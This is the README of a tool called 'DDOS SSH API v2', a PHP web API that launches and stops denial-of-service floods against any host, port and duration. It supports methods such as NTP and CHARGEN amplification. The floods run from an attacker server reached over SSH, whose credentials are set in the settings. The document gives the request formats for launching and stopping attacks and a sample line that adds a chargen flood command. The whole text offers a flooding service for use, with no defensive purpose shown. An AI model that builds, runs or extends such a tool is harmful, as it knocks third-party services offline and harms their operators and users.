DDOS SSH API v2

## USE ##


Launch attack:
  - Format: GET http://yourlink.co/?host=HOST&port=PORT&time=TIME&method=METHOD
  - Format example: GET http://yourlink.co/?host=127.0.0.1&port=80&time=60&method=NTP

Stop attack:
  - Format: GET http://yourlink.co/?host=HOST&port=PORT&method=STOP
  - Format example: GET http://yourlink.co/?host=127.0.0.1&&method=STOP
  
Add method:
  - Format example: $_METHOD["CHARGEN"] = "./chargen %ip% %port% chargen.txt 1 -1 %time%";


## Settings ##

php:
  - $_JSON: if true, api return format is JSON
  
  - $_HOST: Host, attacker (server) IPV4
  - $_PORT: Host, attacker (server) SSH port (default:22)
  - $_USER: Host, attacker (server) SSH username
  - $_PASSWORD: Host, attacker (server) SSH password
  
  - $_TIMEMIN: Minimal attack time
  - $_TIMEMAX: Maximal attack time
